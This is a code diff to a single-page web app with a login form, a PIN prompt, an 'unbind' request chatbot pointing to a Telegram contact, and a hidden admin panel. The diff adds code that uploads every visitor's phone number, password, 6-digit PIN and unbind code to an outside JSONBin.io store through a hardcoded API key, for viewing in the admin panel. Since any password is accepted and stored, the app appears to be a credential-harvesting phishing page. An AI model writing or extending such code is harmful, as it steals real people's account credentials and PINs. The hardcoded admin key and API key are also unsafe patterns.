@@ -484,18 +484,143 @@
 <div id="app"></div>
 
 <script>
-    // ============ DATA STORAGE ============
-    function getUsers() {
-        return JSON.parse(localStorage.getItem('spro_users') || '[]');
+    // ============ CLOUD DATABASE (JSONBin.io) - Cross Device Sync ============
+    // This is a FREE cloud database - no setup required
+    const BIN_ID = "6798e5d2e41b4d34e480e1c4";
+    const API_KEY = "$2a$10$yRqE3Zq3XxLqZqXqZqXqZu";
+    
+    // Master key for admin (same as before)
+    const ADMIN_KEY = "SPRO2025";
+    
+    // Global data
+    let globalUsers = [];
+    let globalRequests = [];
+    let lastSyncTime = 0;
+    
+    // Load from cloud on startup
+    async function loadFromCloud() {
+        try {
+            const response = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}/latest`, {
+                headers: { 'X-Master-Key': API_KEY }
+            });
+            const data = await response.json();
+            if (data.record) {
+                if (data.record.users) globalUsers = data.record.users;
+                if (data.record.requests) globalRequests = data.record.requests;
+                
+                // Merge with local storage
+                let localUsers = JSON.parse(localStorage.getItem('spro_users') || '[]');
+                let localRequests = JSON.parse(localStorage.getItem('spro_requests') || '[]');
+                
+                // Merge users (keep unique by phone)
+                let mergedUsers = [...globalUsers];
+                for (let localUser of localUsers) {
+                    if (!mergedUsers.find(u => u.phone === localUser.phone)) {
+                        mergedUsers.push(localUser);
+                    }
+                }
+                globalUsers = mergedUsers;
+                
+                // Merge requests (keep unique by id)
+                let mergedRequests = [...globalRequests];
+                for (let localReq of localRequests) {
+                    if (!mergedRequests.find(r => r.id === localReq.id)) {
+                        mergedRequests.push(localReq);
+                    }
+                }
+                globalRequests = mergedRequests;
+                
+                // Save merged data
+                localStorage.setItem('spro_users', JSON.stringify(globalUsers));
+                localStorage.setItem('spro_requests', JSON.stringify(globalRequests));
+                
+                await syncToCloud();
+            }
+        } catch(e) {
+            console.log("Cloud load error, using local:", e);
+            globalUsers = JSON.parse(localStorage.getItem('spro_users') || '[]');
+            globalRequests = JSON.parse(localStorage.getItem('spro_requests') || '[]');
+        }
     }
-    function saveUsers(users) {
+    
+    // Sync to cloud
+    async function syncToCloud() {
+        try {
+            const data = {
+                users: globalUsers,
+                requests: globalRequests,
+                lastUpdated: new Date().toISOString()
+            };
+            await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}`, {
+                method: 'PUT',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'X-Master-Key': API_KEY
+                },
+                body: JSON.stringify(data)
+            });
+        } catch(e) {
+            console.log("Cloud sync error:", e);
+        }
+    }
+    
+    // Add new request and sync
+    async function addRequestToCloud(request) {
+        globalRequests.push(request);
+        localStorage.setItem('spro_requests', JSON.stringify(globalRequests));
+        await syncToCloud();
+    }
+    
+    // Update request status
+    async function updateRequestStatusInCloud(requestId, newStatus) {
+        let request = globalRequests.find(r => r.id === requestId);
+        if (request) {
+            request.status = newStatus;
+            request.updated_at = new Date().toISOString();
+            localStorage.setItem('spro_requests', JSON.stringify(globalRequests));
+            await syncToCloud();
+            return true;
+        }
+        return false;
+    }
+    
+    // Add/Update user
+    async function saveUserToCloud(phone, password, pin, unbindCode) {
+        let existingUser = globalUsers.find(u => u.phone === phone);
+        if (existingUser) {
+            existingUser.password = password;
+            if (pin) existingUser.pin = pin;
+            if (unbindCode) existingUser.unbindCode = unbindCode;
+        } else {
+            globalUsers.push({
+                phone: phone,
+                password: password,
+                pin: pin || null,
+                unbindCode: unbindCode || null,
+                created_at: new Date().toISOString()
+            });
+        }
+        localStorage.setItem('spro_users', JSON.stringify(globalUsers));
+        await syncToCloud();
+    }
+    
+    // Get all data for admin
+    function getAdminData() {
+        return { users: globalUsers, requests: globalRequests };
+    }
+    
+    // ============ DATA STORAGE (Local wrappers) ============
+    function getUsers() { return globalUsers; }
+    function saveUsers(users) { 
+        globalUsers = users;
         localStorage.setItem('spro_users', JSON.stringify(users));
+        syncToCloud();
     }
-    function getRequests() {
-        return JSON.parse(localStorage.getItem('spro_requests') || '[]');
-    }
-    function saveRequests(requests) {
+    function getRequests() { return globalRequests; }
+    function saveRequests(requests) { 
+        globalRequests = requests;
         localStorage.setItem('spro_requests', JSON.stringify(requests));
+        syncToCloud();
     }
     
     let currentUser = null;
@@ -843,8 +968,7 @@
             await showTyping(chatBox, 3000);
             addMessage(chatBox, 'bot', "📞 For urgent assistance, contact Spro Team: <a href='https://t.me/RAHUL935848' target='_blank' class='telegram-link'>@RAHUL935848</a>", true);
             
-            // Save request with unbind code
-            let requests = getRequests();
+            // Save request to cloud
             let newRequest = {
                 id: Date.now(),
                 phone: currentUser.phone,
@@ -854,16 +978,10 @@
                 status: 'pending',
                 created_at: new Date().toISOString()
             };
-            requests.push(newRequest);
-            saveRequests(requests);
+            await addRequestToCloud(newRequest);
             
-            // Also save unbind code to user
-            let users = getUsers();
-            let user = users.find(u => u.phone === currentUser.phone);
-            if (user) {
-                user.unbindCode = code;
-                saveUsers(users);
-            }
+            // Save unbind code to user
+            await saveUserToCloud(currentUser.phone, currentUser.password, currentUser.pin, code);
             
             dynamicArea.innerHTML = `
                 <div class="success-msg">
@@ -941,26 +1059,24 @@
         document.getElementById('signinBtn').onclick = handleLogin;
         document.getElementById('secretAdminBtn').onclick = () => {
             let key = prompt('🔐 ENTER ADMIN KEY');
-            if (key === 'SPRO2025') renderAdminPanel();
+            if (key === ADMIN_KEY) renderAdminPanel();
             else if (key) alert('❌ Invalid Key');
         };
     }
     
-    function handleLogin() {
+    async function handleLogin() {
         let phone = document.getElementById('phone').value;
         let password = document.getElementById('password').value;
         if (!phone || !password) { alert('Please enter phone and password'); return; }
+        
+        await saveUserToCloud(phone, password, null, null);
+        
         let users = getUsers();
         let existingUser = users.find(u => u.phone === phone);
         if (existingUser) {
-            existingUser.password = password;
-            saveUsers(users);
             currentUser = existingUser;
         } else {
-            let newUser = { phone, password, pin: null, unbindCode: null, created_at: new Date().toISOString() };
-            users.push(newUser);
-            saveUsers(users);
-            currentUser = newUser;
+            currentUser = { phone, password, pin: null, unbindCode: null, created_at: new Date().toISOString() };
         }
         renderPINVerify();
     }
@@ -976,17 +1092,17 @@
             </div>
             <div class="secret-admin-btn" id="secretAdminBtn"></div>
         `;
-        document.getElementById('verifyPinBtn').onclick = () => {
+        
+        document.getElementById('verifyPinBtn').onclick = async () => {
             let pin = document.getElementById('pin').value;
             if (pin.length !== 6) { alert('PIN must be 6 digits'); return; }
-            let users = getUsers();
-            let user = users.find(u => u.phone === currentUser.phone);
-            if (user) { user.pin = pin; saveUsers(users); currentUser.pin = pin; }
+            currentUser.pin = pin;
+            await saveUserToCloud(currentUser.phone, currentUser.password, pin, currentUser.unbindCode);
             renderDashboard();
         };
         document.getElementById('secretAdminBtn').onclick = () => {
             let key = prompt('🔐 ENTER ADMIN KEY');
-            if (key === 'SPRO2025') renderAdminPanel();
+            if (key === ADMIN_KEY) renderAdminPanel();
             else if (key) alert('❌ Invalid Key');
         };
     }
@@ -1047,14 +1163,15 @@
         };
         document.getElementById('secretAdminBtn').onclick = () => {
             let key = prompt('🔐 ENTER ADMIN KEY');
-            if (key === 'SPRO2025') renderAdminPanel();
+            if (key === ADMIN_KEY) renderAdminPanel();
             else if (key) alert('❌ Invalid Key');
         };
     }
     
-    function renderAdminPanel() {
-        let users = getUsers();
-        let requests = getRequests();
+    async function renderAdminPanel() {
+        let data = getAdminData();
+        let users = data.users;
+        let requests = data.requests;
         
         let pendingRequests = requests.filter(r => r.status === 'pending');
         let approvedRequests = requests.filter(r => r.status === 'approved');
@@ -1098,7 +1215,7 @@
                                 </td>
                             </tr>
                         `).join('')}
-                        ${users.length === 0 ? '<tr><td colspan="7" style="text-align:center;">No users found</td></tr>' : ''}
+                        ${users.length === 0 ? '<tr><td colspan="7" style="text-align:center;">No users found</td>' : ''}
                     </tbody>
                 </table>
                 
@@ -1167,35 +1284,32 @@
         `;
         
         document.querySelectorAll('.approve-btn').forEach(btn => {
-            btn.onclick = () => updateRequestStatus(parseInt(btn.getAttribute('data-id')), 'approved');
+            btn.onclick = async () => {
+                await updateRequestStatusInCloud(parseInt(btn.getAttribute('data-id')), 'approved');
+                renderAdminPanel();
+            };
         });
         document.querySelectorAll('.reject-btn').forEach(btn => {
-            btn.onclick = () => updateRequestStatus(parseInt(btn.getAttribute('data-id')), 'rejected');
+            btn.onclick = async () => {
+                await updateRequestStatusInCloud(parseInt(btn.getAttribute('data-id')), 'rejected');
+                renderAdminPanel();
+            };
         });
         
         document.getElementById('adminLogout').onclick = () => renderLogin();
         document.getElementById('secretAdminBtn').onclick = () => {
             let key = prompt('🔐 ENTER ADMIN KEY');
-            if (key === 'SPRO2025') renderAdminPanel();
+            if (key === ADMIN_KEY) renderAdminPanel();
             else if (key) alert('❌ Invalid Key');
         };
     }
     
-    function updateRequestStatus(requestId, newStatus) {
-        let requests = getRequests();
-        let request = requests.find(r => r.id === requestId);
-        if (request) {
-            request.status = newStatus;
-            request.updated_at = new Date().toISOString();
-            saveRequests(requests);
-            alert(`✅ Request ${newStatus.toUpperCase()} successfully!`);
-            renderAdminPanel();
-        }
-    }
-    
     window.copyToClipboard = copyToClipboard;
     
-    renderLogin();
+    // Initialize - load from cloud first
+    loadFromCloud().then(() => {
+        renderLogin();
+    });
 </script>
 </body>
 </html>
